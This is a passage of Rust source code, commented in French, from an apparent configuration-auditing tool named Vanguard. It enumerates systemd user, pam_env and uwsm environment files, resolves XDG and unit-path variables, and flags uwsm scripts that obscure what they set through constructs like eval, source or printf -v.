/// qu'il pose (`script_cache_ce_qu_il_pose`, V-2). Ceux du compte (environment.d, user.conf et user.conf.d,
/// ~/.pam_environment, tout ~/.config/uwsm, et ceux d'un XDG_CONFIG_HOME déplacé), ceux d'uwsm sous chacun de ses
/// autres dossiers (`dossiers_d_uwsm`, les mêmes que le bilan : V-3), et ceux du système (/etc/environment,
/// pam_env.conf, environment.d, user.conf et user.conf.d) qui ne sont pas à root seul (`de_root_seul`). Un fichier
/// masqué (lien vers /dev/null) ne compte pas. Un dossier qui ne se lit pas, ou un fichier qui n'est pas ordinaire,
/// lève : non vérifié, jamais tu. Pas lus : les profils des shells (que uwsm lit aussi) et l'environnement posé en
/// cours de session (`systemctl --user set-environment`), qui ne laissent pas de fichier.
fn environnement_change_la_sauvegarde(r: &Releveur, vide: bool) -> bool {
    let (fichiers, illisibles) = fichiers_du_gestionnaire(r, &configs_posees(&r.gestionnaire), &dossiers_d_uwsm(r));
    // V-2 : les scripts d'uwsm lus, seuls fichiers qu'une inclusion peut nommer sans lever.
    let scripts: Vec<std::path::PathBuf> = fichiers
        .iter()
        .filter(|(_, _, sorte)| *sorte == Variables::Shell)
        .map(|(f, _, _)| f.clone())
        .collect();
    // V-1 : un dossier d'unités posé au gestionnaire sous une forme qui ne se résout pas.
    !illisibles.is_empty()
        || !r.gestionnaire_non_resolu.is_empty()
        || fichiers.iter().any(|(f, du_compte, sorte)| {
            if std::fs::read_link(f).is_ok_and(|v| v == Path::new("/dev/null")) {
                return false;
            }
            if !du_compte && de_root_seul(f) {
                return false;
            }
            match temoins::lire_borne(f, AJOUT_MAX) {
                Err(e) if e.kind() == std::io::ErrorKind::NotFound => false,
                Err(_) => true,
                Ok(lu) => {
                    let texte = coupe_comme_systemd(&String::from_utf8_lossy(&lu.octets), *sorte);
                    !lu.entier
                        || nomme_une_variable_de_la_sauvegarde(&texte, vide)
                        || (*sorte == Variables::Shell && script_cache_ce_qu_il_pose(&texte, &r.maison, &scripts))
                }
            }
        })
}

/// V-2 (relecture 0.95) : un script de variables (~/.config/uwsm/env…) cache ce qu'il pose au gestionnaire : une
/// inclusion (« source », « . ») d'un fichier qui n'est pas dans `lus` ou dont le chemin ne se résout pas, « eval »,
/// « read » ou « printf -v », un nom exporté qui n'est pas un mot fixe (« ${n}LOAD », guillemets dans le nom,
/// « $(…) »), ou systemctl / dbus-update-activation-environment avec un argument construit. Ni « $HOME » ni « ~ »
/// ne comptent comme construits. Plus large que le shell : un faux positif lève, il ne tait jamais. Ce qu'un
/// programme lancé par le script fait d'autre n'est pas vu (limite dite).
fn script_cache_ce_qu_il_pose(texte: &str, maison: &Path, lus: &[std::path::PathBuf]) -> bool {
    let identifiant = |m: &str| {
        let mut o = m.bytes();
        o.next().is_some_and(|p| p.is_ascii_alphabetic() || p == b'_')
            && o.all(|x| x.is_ascii_alphanumeric() || x == b'_')
    };
    let lu = |cible: &str| {
        let net = cible
            .strip_prefix('"')
            .and_then(|c| c.strip_suffix('"'))
            .or_else(|| cible.strip_prefix('\'').and_then(|c| c.strip_suffix('\'')))
            .unwrap_or(cible);
        let reste = ["~/", "$HOME/", "${HOME}/"].iter().find_map(|d| net.strip_prefix(d));
        let chemin = match reste {
            Some(r) => maison.join(r),
            None if net.starts_with('/') => std::path::PathBuf::from(net),
            None => return false,
        };
        let s = chemin.to_string_lossy();
        !s.contains(['$', '`', '\\', '"', '\'', '*', '?', '[']) && !s.contains("/../") && lus.contains(&chemin)
    };
    for commande in commandes_shell(&texte.replace("\\\n", "")) {
        let mut mots = commande.iter().map(String::as_str).skip_while(|m| {
            [
                "then", "else", "do", "!", "if", "elif", "while", "until", "{", "(", "time", "command", "builtin",
            ]
            .contains(m)
        });
        let Some(premier) = mots.next() else {
            continue;
        };
        let args: Vec<&str> = mots.collect();
        let cache = match premier {
            "source" | "." => !args.first().is_some_and(|c| lu(c)),
            "eval" | "read" | "mapfile" | "readarray" => true,
            "printf" => args.iter().any(|a| a.starts_with("-v")),
            "export" | "declare" | "typeset" | "local" | "readonly" => {
                args.iter().filter(|a| !a.starts_with('-')).any(|a| {
                    let a = a.strip_prefix(['"', '\'']).unwrap_or(a);
                    !identifiant(a.split('=').next().unwrap_or(a))
                })
            }
            "systemctl" | "dbus-update-activation-environment" => args.iter().any(|a| a.contains(['$', '`'])),
            _ => false,
        };
        if cache {
            return true;
        }
    }
    false
}

/// Les commandes d'un texte de shell, chacune en mots bruts (guillemets et « \ » gardés) : une ligne se coupe à « ; »,
/// « & » et « | » hors guillemets, un mot aux blancs hors guillemets ; un commentaire « # » en tête de mot finit la
/// ligne. Juste assez pour `script_cache_ce_qu_il_pose`.
fn commandes_shell(texte: &str) -> Vec<Vec<String>> {
    let mut commandes = Vec::new();
    for ligne in texte.lines() {
        let (mut mots, mut mot, mut guillemet, mut echappe) = (Vec::new(), String::new(), None::<char>, false);
        let finir = |mots: &mut Vec<String>, mot: &mut String| {
            if !mot.is_empty() {
                mots.push(std::mem::take(mot));
            }
        };
        for c in ligne.chars() {
            if echappe {
                mot.push(c);
                echappe = false;
                continue;
            }
            match (guillemet, c) {
                (Some(g), _) if c == g => {
                    guillemet = None;
                    mot.push(c);
                }
                (Some('"') | None, '\\') => {
                    echappe = true;
                    mot.push(c);
                }
                (None, '"' | '\'') => {
                    guillemet = Some(c);
                    mot.push(c);
                }
                (None, '#') if mot.is_empty() => break,
                (None, ' ' | '\t') => finir(&mut mots, &mut mot),
                (None, ';' | '&' | '|') => {
                    finir(&mut mots, &mut mot);
                    if !mots.is_empty() {
                        commandes.push(std::mem::take(&mut mots));
                    }
                }
                _ => mot.push(c),
            }
        }
        finir(&mut mots, &mut mot);
        if !mots.is_empty() {
            commandes.push(mots);
        }
    }
    commandes
}

/// Les fichiers qu'uwsm peut lire dans un de ses dossiers « uwsm » : tous ceux du dossier (« env », « env-<bureau> »
/// et ce qu'ils peuvent inclure : relecture 0.95, V-2), puis ceux de ses sous-dossiers « env.d » et « env-<bureau>.d »,
/// qu'uwsm lit après le fichier du même nom (uwsm 0.27, prepare-env.sh, `source_dir` : relecture 0.95, W-2) ; pas plus
/// bas. Plus large qu'uwsm (ses « *.bak », « *~ »… passés, ses fichiers cachés) : un fichier de trop se lit. Une seule
/// liste pour ~/.config/uwsm et pour tout autre dossier où uwsm cherche (S-4, re-contrôle 2 0.95) : un lien se suit
/// comme uwsm le suit, « [ -d ] » et « [ -f ] » ; un « env.d » qui est un lien vers un dossier se descend, un lien
/// vers un dossier n'est pas un fichier. Les dossiers qui ne se lisent pas vont dans `illisibles`, jamais tus. Dans
/// l'ordre des noms : le verdict ne dépend pas du système de fichiers.
///
/// V-4 (relecture du lot c2-uwsm, 0.95) : un dossier qui n'en est pas un (absent, un fichier, un lien cassé ou vers
/// un fichier, « n'est pas un dossier » plus haut dans son chemin) est absent, comme pour uwsm, qui n'y lit rien ;
/// seule une autre erreur le dit illisible. V-5 : une entrée dont la nature ne se lit pas (un lien vers un dossier
/// fermé) va dans `illisibles`, au lieu de passer pour un fichier puis de se taire.
fn fichiers_d_uwsm(dossier: &Path, illisibles: &mut Vec<std::path::PathBuf>) -> Vec<std::path::PathBuf> {
    let absent = |e: &std::io::Error| {
        matches!(
            e.kind(),
            std::io::ErrorKind::NotFound | std::io::ErrorKind::NotADirectory
        )
    };
    let mut fichiers = Vec::new();
    let mut a_lire = vec![(dossier.to_path_buf(), true)];
    while let Some((d, haut)) = a_lire.pop() {
        match std::fs::symlink_metadata(&d) {
            Err(e) if absent(&e) => continue,
            Err(_) => {
                illisibles.push(d);
                continue;
            }
            Ok(_) => {}
        }
        let entrees = match std::fs::read_dir(&d) {
            Ok(entrees) => entrees,
            Err(e) if absent(&e) => continue,
            Err(_) => {
                illisibles.push(d);
                continue;
            }
        };
        for e in entrees {
            let Ok(e) = e else {
                illisibles.push(d.clone());
                break;
            };
            let p = e.path();
            // `metadata` suit le lien, comme « [ -d ] » ; un lien cassé, ou une boucle de liens, n'est pas un dossier
            // (il se lit, et manque). Toute autre erreur : sa nature ne se juge pas, c'est dit (V-5).
            let est_dossier = match std::fs::metadata(&p) {
                Ok(m) => m.is_dir(),
                Err(e) if absent(&e) || e.raw_os_error() == Some(libc::ELOOP) => false,
                Err(_) => {
                    illisibles.push(p);
                    continue;
                }
            };
            let nom = e.file_name();
            let nom = nom.to_string_lossy();
            if est_dossier {
                if haut && (nom == "env.d" || (nom.starts_with("env-") && nom.ends_with(".d"))) {
                    a_lire.push((p, false));
                }
                continue;
            }
            fichiers.push(p);
        }
    }
    fichiers.sort();
    fichiers
}

/// Les dossiers où uwsm cherche aussi « uwsm/env… », en plus de ceux de configuration et de ses valeurs par défaut
/// (uwsm 0.27, prepare-env.sh, `get_all_config_dirs_extended`) : chaque XDG_CONFIG_DIRS et XDG_DATA_DIRS de la
/// session, et ceux posés au gestionnaire de systemd du compte. V-3 (relecture du lot c2-uwsm, 0.95) : une seule
/// liste pour le bilan (`fichiers_de_configuration`) et la sauvegarde (`environnement_change_la_sauvegarde`), qui ne
/// lisait que les XDG_DATA_DIRS posés au gestionnaire : un « uwsm/env » d'un dossier de la session qui pose
/// LD_LIBRARY_PATH ne la levait pas. V-1 : avec les morceaux relatifs (de la session, `Releveur::uwsm_session`, ou
/// posés au gestionnaire, `RELATIF_POUR_UWSM`), joints au dossier personnel, et chaque morceau d'un XDG_CONFIG_HOME
/// de la session.
fn dossiers_d_uwsm(r: &Releveur) -> Vec<std::path::PathBuf> {
    let mut dossiers: Vec<std::path::PathBuf> = Vec::new();
    for d in r.config_systeme.iter().chain(&r.donnees_systeme).chain(&r.uwsm_session) {
        if !dossiers.contains(d) {
            dossiers.push(d.clone());
        }
    }
    for (v, d) in &r.gestionnaire {
        if ["XDG_DATA_DIRS", "XDG_CONFIG_DIRS", RELATIF_POUR_UWSM].contains(v) && !dossiers.contains(d) {
            dossiers.push(d.clone());
        }
    }
    dossiers
}

/// Les fichiers qui posent des variables au gestionnaire de systemd du compte : (fichier, du compte). Ceux du compte
/// (environment.d, user.conf et user.conf.d, tout ~/.config/uwsm, et ceux d'un XDG_CONFIG_HOME déplacé,
/// ~/.pam_environment), et ceux du système (/etc/environment, pam_env.conf, environment.d, user.conf et user.conf.d).
/// Avec les dossiers qui ne se lisent pas. `posees` : les XDG_CONFIG_HOME et XDG_CONFIG_DIRS que ces fichiers posent
/// eux-mêmes au gestionnaire (`configs_posees`), lus comme ~/.config : le user.conf d'un dossier déplacé par
/// ~/.pam_environment pose à son tour des dossiers d'unités (relecture 0.95, W-1, chaîne à deux niveaux).
#[allow(clippy::type_complexity)]
fn fichiers_du_gestionnaire(
    r: &Releveur,
    posees: &[std::path::PathBuf],
    donnees: &[std::path::PathBuf],
) -> (Vec<(std::path::PathBuf, bool, Variables)>, Vec<std::path::PathBuf>) {
    let s = |c: &str| r.sous(Path::new(c));
    let mut fichiers: Vec<(std::path::PathBuf, bool, Variables)> = Vec::new();
    let mut illisibles = Vec::new();
    // Les fichiers d'un dossier : ceux en « .conf », ou ceux qu'uwsm peut lire (`fichiers_d_uwsm`, S-4).
    let mut dossier = |d: std::path::PathBuf,
                       du_compte: bool,
                       sorte: Variables,
                       fichiers: &mut Vec<(std::path::PathBuf, bool, Variables)>| {
        if sorte == Variables::Shell {
            let trouves = fichiers_d_uwsm(&d, &mut illisibles);
            fichiers.extend(trouves.into_iter().map(|f| (f, du_compte, sorte)));
            return;
        }
        match std::fs::symlink_metadata(&d) {
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => return,
            Err(_) => {
                illisibles.push(d);
                return;
            }
            Ok(_) => {}
        }
        let Ok(entrees) = std::fs::read_dir(&d) else {
            illisibles.push(d);
            return;
        };
        for e in entrees {
            let Ok(e) = e else {
                illisibles.push(d.clone());
                break;
            };
            let p = e.path();
            if a_l_extension(&p, "conf") {
                fichiers.push((p, du_compte, sorte));
            }
        }
    };
    let mut configs = vec![r.maison.join(".config")];
    if let Some(c) = &r.config {
        configs.push(r.sous(c));
    }
    for c in posees {
        let c = r.sous(c);
        if !configs.contains(&c) {
            configs.push(c);
        }
    }
    // X-1 (relecture 0.95) : la sorte de chaque fichier vient du dossier où il est trouvé, jamais d'un morceau de son
    // chemin : un dossier de réglages déplacé vers « ~/x/uwsm » garde son user.conf lu comme réglage de systemd.
    for c in &configs {
        dossier(c.join("environment.d"), true, Variables::Cles, &mut fichiers);
        dossier(c.join("systemd/user.conf.d"), true, Variables::Systemd, &mut fichiers);
        dossier(c.join("uwsm"), true, Variables::Shell, &mut fichiers);
        fichiers.push((c.join("systemd/user.conf"), true, Variables::Systemd));
    }
    // X-2 : uwsm lit aussi « uwsm/env… » sous XDG_CONFIG_DIRS et XDG_DATA_DIRS (uwsm 0.27, prepare-env.sh,
    // `get_all_config_dirs_extended`) : ceux posés par un fichier du gestionnaire (`donnees`), du compte quand ils sont
    // dans la maison, et leurs valeurs par défaut, du système (Omarchy y pose /usr/share/uwsm/env.d).
    let mut lus_par_uwsm: Vec<(std::path::PathBuf, bool)> = ["/etc/xdg", "/usr/local/share", "/usr/share"]
        .iter()
        .map(|d| (s(d), false))
        .collect();
    for d in donnees {
        let d = r.sous(d);
        if !configs.contains(&d) && !lus_par_uwsm.iter().any(|(x, _)| *x == d) {
            lus_par_uwsm.push((d.clone(), d.starts_with(&r.maison)));
        }
    }
    for (d, du_compte) in lus_par_uwsm {
        dossier(d.join("uwsm"), du_compte, Variables::Shell, &mut fichiers);
    }
    fichiers.push((r.maison.join(".pam_environment"), true, Variables::Cles));
    for (d, sorte) in [
        ("/etc/environment.d", Variables::Cles),
        ("/run/environment.d", Variables::Cles),
        ("/usr/local/lib/environment.d", Variables::Cles),
        ("/usr/lib/environment.d", Variables::Cles),
        ("/etc/systemd/user.conf.d", Variables::Systemd),
        ("/run/systemd/user.conf.d", Variables::Systemd),
        ("/usr/local/lib/systemd/user.conf.d", Variables::Systemd),
        ("/usr/lib/systemd/user.conf.d", Variables::Systemd),
    ] {
        dossier(s(d), false, sorte, &mut fichiers);
    }
    for (f, sorte) in [
        ("/etc/environment", Variables::Cles),
        ("/etc/security/pam_env.conf", Variables::Cles),
        ("/etc/systemd/user.conf", Variables::Systemd),
        ("/run/systemd/user.conf", Variables::Systemd),
        ("/usr/local/lib/systemd/user.conf", Variables::Systemd),
        ("/usr/lib/systemd/user.conf", Variables::Systemd),
    ] {
        fichiers.push((s(f), false, sorte));
    }
    (fichiers, illisibles)
}

/// Les variables par lesquelles systemd du compte calcule les dossiers où il cherche ses unités (relecture 0.95, V-1).
const VARIABLES_DES_DOSSIERS: [&str; 5] = [
    "XDG_CONFIG_HOME",
    "XDG_CONFIG_DIRS",
    "XDG_DATA_HOME",
    "XDG_DATA_DIRS",
    "SYSTEMD_UNIT_PATH",
];

/// V-1 (relecture du lot c2-uwsm, 0.95) : les variables dont uwsm lit chaque morceau (coupé à « : ») comme un dossier où
/// chercher « uwsm/env… » (uwsm 0.27, prepare-env.sh, `get_all_config_dirs_extended`), un morceau relatif compris.
const VARIABLES_D_UWSM: [&str; 3] = ["XDG_CONFIG_HOME", "XDG_CONFIG_DIRS", "XDG_DATA_DIRS"];

/// L'étiquette, dans `Releveur::gestionnaire`, d'un morceau relatif d'une `VARIABLES_D_UWSM` posé au gestionnaire
/// (V-1) : systemd l'ignore (aucun dossier d'unités n'en vient), seul `dossiers_d_uwsm` le lit.
const RELATIF_POUR_UWSM: &str = "relatif (uwsm)";

/// W-1 (relecture 0.95) : les variables par lesquelles systemd du compte place ailleurs tous ses dossiers d'unités
/// (HOME pour ~/.config et ~/.local/share quand les XDG_* manquent, XDG_RUNTIME_DIR pour ceux de la session) ou
/// lance d'autres générateurs (de qui viennent des unités, ou l'environnement de chacune, celui d'« env » compris).
/// Vanguard ne recalcule pas ces dossiers : posée au gestionnaire, une telle variable est dite non résolue (non
/// vérifié), ce qui lève aussi la sauvegarde exacte, ses deux formes (« env -i » ne vide pas l'environnement du
/// gestionnaire, qui choisit l'unité). Mesuré sur systemd 262 : environment.d ne change que l'environnement des
/// unités, pas celui du gestionnaire : il n'est pas compté ici.
const VARIABLES_QUI_DEPLACENT: [&str; 4] = [
    "HOME",
    "XDG_RUNTIME_DIR",
    "SYSTEMD_GENERATOR_PATH",
    "SYSTEMD_ENVIRONMENT_GENERATOR_PATH",
];

/// Au plus autant de tours pour suivre une chaîne de XDG_CONFIG_HOME posés (W-1) : au-delà, c'est dit non résolu.
const TOURS_DU_GESTIONNAIRE: usize = 8;

/// Les XDG_CONFIG_HOME et XDG_CONFIG_DIRS que posent les fichiers du gestionnaire (`dossiers_du_gestionnaire`).
fn configs_posees(dossiers: &[(&'static str, std::path::PathBuf)]) -> Vec<std::path::PathBuf> {
    let mut sortie: Vec<std::path::PathBuf> = Vec::new();
    for (v, d) in dossiers {
        if ["XDG_CONFIG_HOME", "XDG_CONFIG_DIRS"].contains(v) && !sortie.contains(d) {
            sortie.push(d.clone());
        }
    }
    sortie
}

/// V-1 (relecture 0.95) : les dossiers que les fichiers du gestionnaire de systemd du compte (`fichiers_du_gestionnaire`,
/// sauf ceux de uwsm, qui ne posent rien au gestionnaire lui-même) posent par une `VARIABLES_DES_DOSSIERS` : une ligne
/// « ManagerEnvironment=XDG_DATA_DIRS=~/.x:… » dans ~/.config/systemd/user.conf fait chercher des unités et leurs
/// compléments dans ~/.x/systemd/user, que Vanguard ne lisait pas. Plus large que systemd (DefaultEnvironment=,
/// environment.d, pam_env lus aussi) : un dossier de trop se lit, il ne tait rien. Ce qui ne se résout pas en
/// chemins (une autre variable, un code, un nom échappé, un fichier qui ne se lit pas) : (fichier, variable), dit
/// non vérifié.
#[allow(clippy::type_complexity)]
fn dossiers_du_gestionnaire(
    r: &Releveur,
) -> (
    Vec<(&'static str, std::path::PathBuf)>,
    Vec<(std::path::PathBuf, String)>,
) {
    // W-1 : relu tant que les fichiers posent un dossier de configuration de plus (borné).
    let mut posees: Vec<std::path::PathBuf> = Vec::new();
    for _ in 0..TOURS_DU_GESTIONNAIRE {
        let (dossiers, non_resolus) = dossiers_du_gestionnaire_lus(r, &posees);
        let nouvelles = configs_posees(&dossiers);
        if nouvelles.iter().all(|c| posees.contains(c)) {
            return (dossiers, non_resolus);
        }
        posees = nouvelles;
    }
    let (dossiers, mut non_resolus) = dossiers_du_gestionnaire_lus(r, &posees);
    non_resolus.push((r.maison.join(".config/systemd/user.conf"), "XDG_CONFIG_HOME".into()));
    (dossiers, non_resolus)
}

/// Un tour de `dossiers_du_gestionnaire`, les dossiers de configuration `posees` lus en plus.
#[allow(clippy::type_complexity)]
fn dossiers_du_gestionnaire_lus(
    r: &Releveur,
    posees: &[std::path::PathBuf],
) -> (
    Vec<(&'static str, std::path::PathBuf)>,
    Vec<(std::path::PathBuf, String)>,
) {
    let (fichiers, illisibles) = fichiers_du_gestionnaire(r, posees, &[]);
    let mut dossiers = Vec::new();
    let mut non_resolus: Vec<(std::path::PathBuf, String)> = illisibles.into_iter().map(|d| (d, "?".into())).collect();
    for (f, du_compte, sorte) in fichiers {
        // W-4 : la forme « valeur par défaut » ne se résout que dans un fichier du système à root seul.
        let defauts = !du_compte && programme_de_root_seul(&r.racine, &f);
        if sorte == Variables::Shell || std::fs::read_link(&f).is_ok_and(|v| v == Path::new("/dev/null")) {
            continue;
        }
        let texte = match temoins::lire_borne(&f, AJOUT_MAX) {
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => continue,
            Ok(lu) if lu.entier => coupe_comme_systemd(&String::from_utf8_lossy(&lu.octets), sorte),
            _ => {
                non_resolus.push((f, "?".into()));
                continue;
            }
        };
        let mut lues = std::collections::BTreeSet::new();
        for (nom, valeur) in affectations(&texte, sorte) {
            // systemd décode les échappements de chaque mot de user.conf (EXTRACT_CUNESCAPE) : un nom écrit échappé
            // (« XDG_DATA_\x44IRS=… ») pose la variable même quand une autre affectation la pose en clair. Dit, pas
            // résolu (R-2) : avant, le nom en clair déjà lu taisait celui-ci.
            let clair = decodee(&nom);
            if clair != nom && VARIABLES_DES_DOSSIERS.contains(&clair.as_str()) {
                non_resolus.push((f.clone(), clair.clone()));
                lues.insert(clair);
                continue;
            }
            let Some(v) = VARIABLES_DES_DOSSIERS.iter().find(|x| **x == nom) else {
                continue;
            };
            match chemins_poses(&valeur, v, &r.maison, defauts) {
                Some((chemins, relatifs)) => {
                    dossiers.extend(chemins.into_iter().map(|c| (*v, c)));
                    // V-1 : un morceau relatif, que systemd ignore, uwsm le lit depuis le dossier personnel.
                    if VARIABLES_D_UWSM.contains(v) {
                        dossiers.extend(relatifs.into_iter().map(|c| (RELATIF_POUR_UWSM, c)));
                    }
                }
                None => non_resolus.push((f.clone(), nom.clone())),
            }
            lues.insert(nom);
        }
        // Une variable nommée autrement qu'en clair (« XDG_DATA_\x44IRS », ligne coupée…) : non lue, donc dite.
        for nom in noms_ecrits(&texte, |n| VARIABLES_DES_DOSSIERS.contains(&n)) {
            if !lues.contains(&nom) {
                non_resolus.push((f.clone(), nom));
            }
        }
        // W-1 : HOME, XDG_RUNTIME_DIR… écrits, sous toute forme, hors d'environment.d.
        if !f.parent().is_some_and(|d| d.ends_with("environment.d")) {
            non_resolus.extend(
                noms_ecrits(&texte, |n| VARIABLES_QUI_DEPLACENT.contains(&n))
                    .into_iter()
                    .map(|n| (f.clone(), n)),
            );
        }
    }
    let mut vus = std::collections::BTreeSet::new();
    dossiers.retain(|d| vus.insert(d.clone()));
    let mut vus = std::collections::BTreeSet::new();
    non_resolus.retain(|d| vus.insert(d.clone()));
    (dossiers, non_resolus)
}

/// Les dossiers d'unités que pose `nom` au gestionnaire (`Releveur::gestionnaire`), chacun joint de `c`, sous la racine.
fn du_gestionnaire(r: &Releveur, nom: &str, c: &str) -> Vec<std::path::PathBuf> {
    r.gestionnaire
        .iter()
        .filter(|(n, _)| *n == nom)
        .map(|(_, d)| r.sous(&if c.is_empty() { d.clone() } else { d.join(c) }))
        .collect()
}

/// Les affectations (nom, valeur) qu'écrit en clair un fichier du gestionnaire : « DefaultEnvironment= » et
/// « ManagerEnvironment= » de user.conf (mots entre guillemets ou non), « A=… » d'environment.d et de
/// /etc/environment, « A DEFAULT=… OVERRIDE=… » de pam_env (les deux valeurs). Ce qu'elle ne sait pas lire n'y est
/// pas : `noms_ecrits` le voit.
fn affectations(texte: &str, sorte: Variables) -> Vec<(String, String)> {
    // user.conf : ses lignes logiques comme les assemble systemd (`lignes_logiques` : commentaire au milieu d'une suite
    // sauté, « \ » + « \r\n » continué ; R-2). Les autres : « \ » + « \n » joints.
    let lignes: Vec<String> = if sorte == Variables::Systemd {
        lignes_logiques(texte)
    } else {
        texte.replace("\\\n", "").lines().map(str::to_string).collect()
    };
    let mut paires = Vec::new();
    for l in &lignes {
        let net = l.trim_matches([' ', '\t']);
        if net.is_empty() || net.starts_with(['#', ';']) {
            continue;
        }
        match sorte {
            Variables::Systemd => {
                let Some((cle, reste)) = net.split_once('=') else {
                    continue;
                };
                if !["DefaultEnvironment", "ManagerEnvironment"].contains(&cle.trim_end()) {
                    continue;
                }
                paires.extend(
                    mots_cites(reste)
                        .into_iter()
                        .filter_map(|m| m.split_once('=').map(|(n, v)| (n.to_string(), v.to_string()))),
                );
            }
            Variables::Cles => {
                let (premier, reste) = net.split_once([' ', '\t']).unwrap_or((net, ""));
                if let Some((n, v)) = net.split_once('=').filter(|(n, _)| !n.contains([' ', '\t'])) {
                    let v = v.trim_matches([' ', '\t']);
                    let v = v
                        .strip_prefix('"')
                        .and_then(|x| x.strip_suffix('"'))
                        .or_else(|| v.strip_prefix('\'').and_then(|x| x.strip_suffix('\'')))
                        .unwrap_or(v);
                    paires.push((n.to_string(), v.to_string()));
                } else {
                    for m in mots_cites(reste) {
                        if let Some(v) = m.strip_prefix("DEFAULT=").or_else(|| m.strip_prefix("OVERRIDE=")) {
                            paires.push((premier.to_string(), v.to_string()));
                        }
                    }
                }
            }
            Variables::Shell | Variables::Hypr => {}
        }
    }
    paires
}

/// Les mots d'une valeur de systemd ou de pam_env, coupés aux blancs hors guillemets, guillemets retirés. Une barre
/// oblique inverse reste telle quelle : le mot ne se lit pas en clair (`chemins_poses` le refuse).
fn mots_cites(texte: &str) -> Vec<String> {
    let mut mots = Vec::new();
    let mut mot = String::new();
    let mut dans: Option<char> = None;
    let mut commence = false;
    for c in texte.chars() {
        match (dans, c) {
            (None, ' ' | '\t') => {
                if commence {
                    mots.push(std::mem::take(&mut mot));
                    commence = false;
                }
            }
            (None, '"' | '\'') => {
                dans = Some(c);
                commence = true;
            }
            (Some(q), _) if c == q => dans = None,
            _ => {
                mot.push(c);
                commence = true;
            }
        }
    }
    if commence {
        mots.push(mot);
    }
    mots
}

/// Les dossiers absolus d'une valeur posée à `nom` (liste séparée par « : »), « $HOME », « ${HOME} », « @{HOME} » et
/// « ~ » en tête remplacés par le dossier personnel `maison`. La valeur d'avant (« $nom », « ${nom} ») est déjà lue
/// (celle de Vanguard, ou les dossiers par défaut) : passée. Un morceau relatif est ignoré par systemd pour une
/// variable XDG (spécification XDG), refusé pour SYSTEMD_UNIT_PATH ; rendu à part, joint au dossier personnel
/// (`depuis_la_maison`), pour uwsm, qui le lit depuis là (V-1, relecture du lot c2-uwsm, 0.95). `None` : un morceau
/// ne se résout pas (autre variable, code « % », guillemet, échappement, joker).
///
/// `defauts` (relecture 0.95, W-4) : un fichier du système à root seul (snapd pose
/// « XDG_DATA_DIRS=${XDG_DATA_DIRS:-/usr/local/share:/usr/share}:/var/lib/snapd/desktop ») : les formes
/// « ${nom:-défaut} » et « ${nom:+texte} » de la même variable se lisent (`defauts_lus`), sans quoi ce fichier levait
/// la sauvegarde à chaque bilan. Pas pour un fichier du compte, ni pour une autre forme : non résolu, comme avant.
#[allow(clippy::type_complexity)]
fn chemins_poses(
    valeur: &str,
    nom: &str,
    maison: &Path,
    defauts: bool,
) -> Option<(Vec<std::path::PathBuf>, Vec<std::path::PathBuf>)> {
    let valeur = if defauts {
        defauts_lus(valeur, nom)
    } else {
        valeur.to_string()
    };
    let mut sortie = Vec::new();
    let mut relatifs = Vec::new();
    for morceau in valeur.split(':') {
        let m = morceau.trim_matches([' ', '\t']);
        if m.is_empty() || [format!("${nom}"), format!("${{{nom}}}"), format!("@{{{nom}}}")].contains(&m.to_string()) {
            continue;
        }
        let m = ["$HOME", "${HOME}", "@{HOME}", "~"]
            .iter()
            .find_map(|d| {
                m.strip_prefix(d)
                    .filter(|x| x.is_empty() || x.starts_with('/'))
                    .map(|x| format!("{}{x}", maison.display()))
            })
            .unwrap_or_else(|| m.to_string());
        if m.contains(['$', '%', '`', '\\', '"', '\'', '*', '?', '[', '{', '}']) {
            return None;
        }
        let p = std::path::PathBuf::from(&m);
        if !p.is_absolute() {
            if nom == "SYSTEMD_UNIT_PATH" {
                return None;
            }
            relatifs.push(depuis_la_maison(maison, &p));
            continue;
        }
        sortie.push(p);
    }
    Some((sortie, relatifs))
}

/// Un dossier tel qu'uwsm le lit depuis son dossier courant : le dossier personnel (le service du compte qui lit ses
/// fichiers, wayland-wm-env@, ne nomme pas de WorkingDirectory=, et systemd lance un service du compte dans le dossier
/// personnel : systemd.exec). Un chemin absolu reste tel quel ; les « . » sont passés.
fn depuis_la_maison(maison: &Path, p: &Path) -> std::path::PathBuf {
    if p.is_absolute() {
        return p.to_path_buf();
    }
    let mut d = maison.to_path_buf();
    d.extend(p.components().filter(|c| !matches!(c, std::path::Component::CurDir)));
    d
}

/// W-4 : « ${nom:-défaut} » devient « ${nom}:défaut » (la valeur d'avant, déjà lue, et le défaut : plus large que
/// le shell, qui ne prend le défaut que sans valeur d'avant) ; « ${nom:+texte} » devient « texte ». Le défaut ou le
/// texte ne contiennent ni « { » ni « } », ni « $ » pour un défaut ; sinon la forme reste, et ne se résout pas.
fn defauts_lus(valeur: &str, nom: &str) -> String {
    let mut sortie = valeur.to_string();
    for (forme, defaut) in [(format!("${{{nom}:-"), true), (format!("${{{nom}:+"), false)] {
        while let Some(debut) = sortie.find(&forme) {
            let dedans = debut.saturating_add(forme.len());
            let Some(fin) = sortie
                .get(dedans..)
                .and_then(|x| x.find('}'))
                .map(|f| dedans.saturating_add(f))
            else {
                break;
            };
            let texte = sortie.get(dedans..fin).unwrap_or_default().to_string();
            if texte.contains('{') || (defaut && texte.contains('$')) {
                break;
            }
            let neuf = if defaut { format!("${{{nom}}}:{texte}") } else { texte };
            sortie.replace_range(debut..=fin, &neuf);
        }
    }
    sortie
}

/// Un fichier d'ajout, ou l'unité d'un ajout : son état, une fois ses directives vérifiées, et son texte (vide pour
/// un ajout absent ou masqué). Un ajout masqué (lien vers /dev/null) ne compte pas, et se lie comme tel.
fn lire_ajout(r: &Releveur, f: &Path) -> Result<(temoins::Etat, String), temoins::Refus> {
    let montre = || crate::ui::affichable(&r.montre(f));
    if std::fs::read_link(f).is_ok_and(|v| v == Path::new("/dev/null")) {
        let masque = temoins::Etat::Lien {
            vers: "/dev/null".into(),
            puis: Box::new(temoins::Etat::Absent),
            vu: std::fs::symlink_metadata(f)
                .map(|m| temoins::Vu::de_dans(&m, f))
                .unwrap_or_default(),
        };
        return Ok((masque, String::new()));
    }
    let lu = match temoins::lire_borne(f, AJOUT_MAX) {
        Ok(lu) => lu,
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok((temoins::Etat::Absent, String::new())),
        Err(e) => {
            return Err(temoins::Refus(trf!(
                "{} ne se lit pas ({e})",
                "{} cannot be read ({e})",
                montre()
            )));
        }
    };
    if !lu.entier {
        return Err(temoins::Refus(trf!(
            "{} est trop gros pour être relu à chaque bilan",
            "{} is too large to be re-read at each check",
            montre()
        )));
    }
